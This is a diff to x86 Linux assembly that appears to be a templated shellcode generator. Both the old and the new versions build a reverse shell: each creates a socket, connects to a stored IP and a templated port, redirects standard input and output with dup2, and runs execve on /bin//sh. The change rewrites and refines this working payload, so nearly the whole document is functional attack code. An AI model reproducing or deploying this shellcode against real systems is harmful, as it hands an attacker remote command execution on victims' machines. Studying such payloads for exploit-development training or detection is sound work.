@@ -232,7 +232,9 @@ main:
     add esp, eax
     sub esp, 4 
     mov eax ,[esp]
+    ;bswap eax
     push eax ; Probably not needed, I just want to ensure it's saved. 
+    mov ebp, eax
 
 
 
@@ -242,77 +244,86 @@ main:
  ;
  ;###################################
 
+ ;
+ ; int socketcall(int call, unsigned long *args);
+ ; sockfd = socket(int socket_family, int socket_type, int protocol);
+ ;
+ push 0x66 
+ pop eax ;syscall: sys_socketcall + cleanup eax
 
-    xor edx,edx ; clear out edx
-	push 0x66 	; create socket
+ push 0x1
+ pop ebx ;sys_socket (0x1) + cleanup ebx
 
-	pop eax ; syscall for socketcall
+ xor edx,edx ;cleanup edx
 
-	push 0x1 
-	pop ebx ; SOCKET_CALL from net.h = 1
+ push edx ;protocol=IPPROTO_IP (0x0)	
+ push ebx ;socket_type=SOCK_STREAM (0x1)
+ push 0x2 ;socket_family=AF_INET (0x2)
 
-	push edx ; push 0
-	push ebx ; value of SOCK_STREAM = 1 got it from header /usr/src
-	
-    pop edx  ; KEEP out IP ADDR
-    
-    push 0x2 ; value 2 from /usr/include/i386-linux-gnu/bits/socket.h
+ mov ecx, esp ;save pointer to socket() args
 
+ int 0x80 ;exec sys_socket
 
+ xchg edx, eax; save result (sockfd) for later usage
 
-	mov ecx,esp ; move ecx to top of the stack
-	int 0x80 ; call interrupt
+ ;
+ ; int socketcall(int call, unsigned long *args);
+ ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+ ;
+ mov al, 0x66
 
-	mov esi,eax ; store returning socket in esi for further use
+  xor ecx, ecx
+   mov ecx, #{encoded_port}
+   ;mov ebp , 0x0100007f  ;sin_addr=127.1.1.1 (network byte order)
+   push ebp ; Pushing our saved IP.
+  
+ ;push word 0x5c11 ;sin_port=4444 (network byte order)
+ push ecx
+ inc ebx          
+ push word bx     ;sin_family=AF_INET (0x2)
+ mov ecx, esp     ;save pointer to sockaddr struct
 
+ push 0x10 ;addrlen=16
+ push ecx  ;pointer to sockaddr
+ push edx  ;sockfd
 
-	;connect
+ mov ecx, esp ;save pointer to sockaddr_in struct
 
+ inc ebx ; sys_connect (0x3)
 
-	push 0x66
-	pop eax           ;syscall for socket_call
+ int 0x80 ;exec sys_connect 
 
-	push 0x3
-	pop ebx           ; SYS_CONNECT = 3 from /usr/include/linux/net.h
+ ;
+ ; int socketcall(int call, unsigned long *args);
+ ; int dup2(int oldfd, int newfd);
+ ;
+ push 0x2
+ pop ecx  ;set loop-counter
 
+ xchg ebx,edx ;save sockfd
 
+; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
+loop:
+ mov al, 0x3f ;syscall: sys_dup2 
+ int 0x80     ;exec sys_dup2
+ dec ecx	     ;decrement loop-counter
+ jns loop     ;as long as SF is not set -> jmp to loop
 
-	
-	push edx	      ; reverse shell IP 
+ ;
+ ; int execve(const char *filename, char *const argv[],char *const envp[]);
+ ;
+ mov al, 0x0b ; syscall: sys_execve
 
+ inc ecx      ;argv=0
+ mov edx,ecx  ;envp=0
 
-	push word #{port}      ; 0x5c11  ; reverse shell port : 4444
-	push word 0x2     ; AF_INET = PF_INET = 2
-	mov edi, esp	  ; move top of the stack to edi to prepare struct
-	push 0x10         ; size = 16
-	push edi          ; push the pointer to created struct
-	push esi          ; created sock
-	mov ecx, esp      ; move top of the stack to ecx
-	
-	int 0x80          ; call system interrupt 
+ push edx        ;terminating NULL
+ push 0x68732f2f	;"hs//"
+ push 0x6e69622f	;"nib/"
 
+ mov ebx, esp ;save pointer to filename
 
-	;redirect Input, output and error to created sock
-
-	mov ebx,esi
-	xor ecx,ecx
-	mov cl,0x2 ; initialize counter to 2
-
-redirectIO:
-	mov al, 0x3f
-	int 0x80
-	dec ecx
-	jns redirectIO
-
-	                    ; spawn a shell using execve /bin/sh
-
-	push edx
-	push 0x68732f2f
-	push 0x6e69622f
-	mov ebx, esp		; /bin//sh
-	mov ecx, edx	    ; NULL
-	mov al, 0xb	        ; syscall for execve
-	int 0x80
+ int 0x80 ; exec sys_execve
 
 
 """
